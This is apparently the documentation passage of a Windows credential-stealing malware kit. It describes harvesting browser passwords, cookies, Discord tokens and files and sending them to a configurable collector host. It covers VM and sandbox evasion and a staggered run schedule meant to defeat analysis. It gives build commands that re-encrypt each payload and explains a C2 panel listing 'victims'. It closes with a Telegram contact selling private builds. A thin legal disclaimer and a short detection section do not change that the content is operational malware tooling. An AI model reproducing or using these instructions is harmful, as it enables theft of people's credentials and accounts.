
Combo format is standard: `url/username:password`. Cookie output is Netscape format — drops straight into curl or any session replay tooling without conversion.

---

## Runtime behaviour

**One shot.** The loader runs, collects, sends, exits. No process left behind, no browser left open, nothing running after the window closes.

**No persistence.** Zero registry writes beyond reads used to locate browser installations. No Run key, no scheduled task, no service, no startup entry of any kind.

**Execution schedule.** Repeated launches don't collect every time. The schedule is: collect on run 1, skip run 2, collect on run 3, skip runs 4 and 5, collect on run 6, and from there the gap widens — 1, 3, 6, 10, 15, 21, onward. Somebody who keeps double-clicking sees a window flash and nothing happen. The counter lives in `%LOCALAPPDATA%\{program name}\` as a plain text file. Delete it to reset the schedule to the beginning.

**Environment checks.** The payload aborts collection silently when it detects:
- A virtual machine
- A machine that booted recently
- No mouse movement or keyboard input since boot

A sandbox detonation gets a process that opens, closes, and never touches a browser.

---

## Building

**Requirements:**
- MinGW-w64 toolchain (`g++`, `windres`) — the build script adds `C:\mingw64\bin` to PATH automatically and stops with a clear error if the compiler isn't found
- Python 3
- Node.js (only required for the panel)

**Default build:**
```bat
build.bat
```

Produces `bin\grabber_127.0.0.1_4444.exe`.

**Custom target:**
```bat
build.bat --host 203.0.113.7 --port 8443
```

**Flags:**

| Flag | Effect |
|------|--------|
| `--host HOST` | Collector address |
| `--port PORT` | Collector port |
| `--path PATH` | Collection endpoint path |
| `--list` | Print available modules |
| `--no-discord` | Disable Discord module |
| `--no-screenshot` | Disable screenshot module |
| *(same pattern for each module)* | |

Every build generates fresh encryption keys. No two output files are identical on disk.

**Verify a build:**
```bat
python builder\verify_roundtrip.py build\payload_data.h build\stealer.exe
```

**What the pipeline does internally:**
1. Writes collector configuration
2. Compiles the App-Bound hook image
3. Amalgamates bundled C libraries
4. Compiles the payload
5. Applies encryption layers (count configurable)
6. Compiles the loader with icon and version resource

---

## Panel

Single Node process. No dependencies to install.

```bash
node panel/c2_server.js 4444
```

Open `http://localhost:4444` in a browser.

**Victims view** — lists every received report. Updates live over a server-sent event stream — no page refresh needed. Clicking a report opens tabs for:

- Host information
- Passwords
- Full combo list (one-click copy)
- Discord tokens
- Cookies
- Autofill entries
- Files (exact disk layout)
- Process list
- Desktop listing
- Screenshot

**Builder view** — form with host, port, endpoint, and module toggles. Hitting build runs the full pipeline and streams the build log line by line into the browser. The finished executable is downloadable from the same page when the build completes.

**One requirement:** the panel must be running before a test launch. The loader checks connectivity first — if nothing answers, it exits without touching anything.

---

## Testing

1. Start the panel: `node panel/c2_server.js 4444`
2. Launch the executable
3. Watch the victims view — first launch collects, second skips, third collects again

To reset the collection schedule: delete `%LOCALAPPDATA%\{program name}\`

To clear the panel: empty `panel\victims\`

---

## Detection surface

For defenders running this in their own environment:

- `WH_KEYBOARD_LL`-style hooks (if added) are flagged by most EDR on unsigned binaries — move to kernel filter driver for evasion testing
- Headless Chrome launch leaves a process tree artifact for the duration of the App-Bound key extraction window
- The schedule counter file is a persistence-like artifact and will flag on forensic review even though it's benign
- NSS calls on Firefox profiles leave traces in handle logs on monitored endpoints
- The collector connection is cleartext unless proxied — monitor outbound on non-standard ports

---

## Legal

For use on machines you own or systems you have explicit written permission to test. No exceptions, no grey areas.

The author carries no responsibility for use outside research and authorised testing. If you're here because you want to understand how credential theft actually works so you can close those gaps — that's exactly who this is for

---

## Contact

For private builds, custom modules, or consulting inquiries:

Telegram: [@simpleman0x](https://t.me/simpleman0x)
